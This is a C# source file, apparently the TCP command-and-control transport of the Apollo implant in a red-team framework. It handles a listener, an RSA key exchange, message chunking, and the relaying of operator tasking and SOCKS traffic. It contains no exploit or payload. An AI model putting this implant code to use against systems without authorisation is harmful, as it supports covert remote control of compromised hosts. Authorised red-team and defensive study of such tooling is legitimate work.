using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Runtime.Serialization.Formatters.Binary;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Serializers;
using ApolloInterop.Constants;
using System.Net.Sockets;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;

namespace TcpTransport
{
    public class TcpProfile : C2Profile, IC2Profile
    {

        internal struct AsyncTcpState
        {
            internal TcpClient Client;
            internal CancellationTokenSource Cancellation;
            internal ST.Task Task;
        }

        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private int _port;
        private AsyncTcpServer _server;
        private bool _encryptedExchangeCheck;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private Dictionary<TcpClient, AsyncTcpState> _writerTasks = new Dictionary<TcpClient, AsyncTcpState>();
        private Action<object> _sendAction;
        
        private bool _uuidNegotiated = false;
        private ST.Task _agentConsumerTask = null;
        private ST.Task _agentProcessorTask = null;

        private string _partialData = "";

        public TcpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _port = int.Parse(data["port"]);
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            _sendAction = (object p) =>
            {
                CancellationTokenSource cts = ((AsyncTcpState)p).Cancellation;
                TcpClient client = ((AsyncTcpState)p).Client;
                while (client.Connected)
                {
                    _senderEvent.WaitOne();
                    if (!cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        client.GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, client);
                    }
                }
            };
        }

        public void OnAsyncConnect(object sender, TcpMessageEventArgs args)
        {
            if (_writerTasks.Count > 0)
            {
                args.Client.Close();
                return;
            }
            AsyncTcpState arg = new AsyncTcpState()
            {
                Client = args.Client,
                Cancellation = new CancellationTokenSource(),
            };
            ST.Task tmp = new ST.Task(_sendAction, arg);
            arg.Task = tmp;
            _writerTasks[args.Client] = arg;
            _writerTasks[args.Client].Task.Start();
            Connected = true;
        }

        public void OnAsyncDisconnect(object sender, TcpMessageEventArgs args)
        {
            args.Client.Client?.Close();
            if (_writerTasks.ContainsKey(args.Client))
            {
                var tmp = _writerTasks[args.Client];
                _writerTasks.Remove(args.Client);
                Connected = _writerTasks.Count > 0;

                tmp.Cancellation.Cancel();
                _senderEvent.Set();
                _receiverEvent.Set();

                tmp.Task.Wait();
            }
        }

        public void OnAsyncMessageReceived(object sender, TcpMessageEventArgs args)
        {
            string sData = Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray());
            int sDataLen = sData.Length;
            int bytesProcessed = 0;
            while (bytesProcessed < sDataLen)
            {
                int lBracket = sData.IndexOf('{');
                int rBracket = sData.IndexOf('}');
                // No left bracket
                if (lBracket == -1)
                {
                    // No left or right bracket
                    if (rBracket == -1)
                    {
                        // Middle of the packet, just append
                        _partialData += sData;
                        bytesProcessed += sData.Length;
                    }
                    else
                    {
                        // This is an ending packet, so we need to process
                        // then shift to the next
                        string d = new string(sData.Take(rBracket+1).ToArray());
                        _partialData += d;
                        bytesProcessed += d.Length;
                        UnwrapMessage();
                        sData = new string(sData.Skip(rBracket).ToArray());
                    }
                }
                // left bracket exists, we're starting a packet
                else
                {
                    // left bracket is ahead of starting index
                    // Thus we're in the middle of a packet receipt
                    if (lBracket > 0)
                    {
                        string d = new string(sData.Take(lBracket).ToArray());
                        _partialData += d;
                        UnwrapMessage();
                        bytesProcessed += d.Length;
                        sData = new string(sData.Skip(d.Length).ToArray());
                    // true start of a new packet
                    } else
                    {
                        // No ending delimiter, will need to wait for more
                        if (rBracket == -1)
                        {
                            _partialData += sData;
                            bytesProcessed += sData.Length;
                        }
                        // Ending delimiter - time to unwrap singleton
                        else
                        {
                            string d = new string(sData.Take(rBracket+1).ToArray());
                            _partialData += d;
                            bytesProcessed += d.Length;
                            if (d.Length < sData.Length)
                            {
                                sData = new string(sData.Skip(d.Length).ToArray());
                            }
                            UnwrapMessage();
                        }
                    }
                }
            }
        }

        private void UnwrapMessage()
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(_partialData);
            _partialData = "";
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            client.GetStream().EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                client.GetStream().BeginWrite(data, 0, data.Length, OnAsyncMessageSent, client);
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach (IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            _senderEvent.Set();
            return true;
        }

        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for(int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
            // Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                _receiverEvent.WaitOne();
                IMythicMessage msg = _recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }


        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncTcpServer(_port, IPC.SEND_SIZE, IPC.RECV_SIZE);
                _server.ConnectionEstablished += OnAsyncConnect;
                _server.MessageReceived += OnAsyncMessageReceived;
                _server.Disconnect += OnAsyncDisconnect;
            }

            if (_encryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            if (_agentProcessorTask == null || _agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            } else
            {
                return true;
            }
        }

        public void Start()
        {
            _agentConsumerTask = new ST.Task(() =>
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            _agentProcessorTask = new ST.Task(() =>
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            _agentConsumerTask.Start();
            _agentProcessorTask.Start();
            _agentProcessorTask.Wait();
            _agentConsumerTask.Wait();
        }

        public bool Send<IMythicMessage>(IMythicMessage message)
        {
            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        public bool IsOneWay()
        {
            return true;
        }

        public bool IsConnected()
        {
            return _writerTasks.Keys.Count > 0;
        }
    }
}
